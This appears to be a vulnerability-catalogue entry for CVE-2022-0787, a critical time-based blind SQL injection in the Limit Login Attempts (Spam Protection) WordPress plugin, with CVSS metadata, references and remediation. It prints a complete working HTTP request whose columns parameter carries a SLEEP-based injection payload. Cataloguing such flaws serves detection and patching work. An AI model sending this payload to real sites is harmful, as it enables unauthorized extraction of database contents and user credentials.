---
layout: "post"
cve_id: "CVE-2022-0787"
title: "Limit Login Attempts (Spam Protection) < 5.1 - SQL Injection"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-0787.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-0787.yaml"
author: "theamanrawat"
severity: "critical"
impact: "Unauthenticated attackers can execute time-based blind SQL injection via AJAX actions to extract database contents, potentially exposing WordPress user credentials and login attempt data.
"
remediation: "Fixed in version 5.1"
reference:
  - "https://wpscan.com/vulnerability/69329a8a-2cbe-4f99-a367-b152bd85b3dd"
  - "https://wordpress.org/plugins/wp-limit-failed-login-attempts/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-0787"
  - "https://github.com/cyllective/CVEs"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2022-0787', 'cwe-id': 'CWE-89', 'epss-score': 0.47173, 'epss-percentile': 0.97576, 'cpe': 'cpe:2.3:a:limit_login_attempts_project:limit_login_attempts:*:*:*:*:*:wordpress:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'limit_login_attempts_project', 'product': 'limit_login_attempts', 'framework': 'wordpress'}"
tags:
  - "time-based-sqli"
  - "cve"
  - "cve2022"
  - "wpscan"
  - "sqli"
  - "wordpress"
  - "wp-plugin"
  - "wp"
  - "wp-limit-failed-login-attempts"
  - "limit_login_attempts_project"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
The Limit Login Attempts (Spam Protection) WordPress plugin before 5.1 does not sanitise and escape some parameters before using them in SQL statements via AJAX actions (available to unauthenticated users), leading to SQL Injections.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Content-Length: 102
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

action=WPLFLA_get_log_data&order[][column]=0&columns[][data]=(SELECT+7382+FROM+(SELECT(SLEEP(6)))ameU)
```

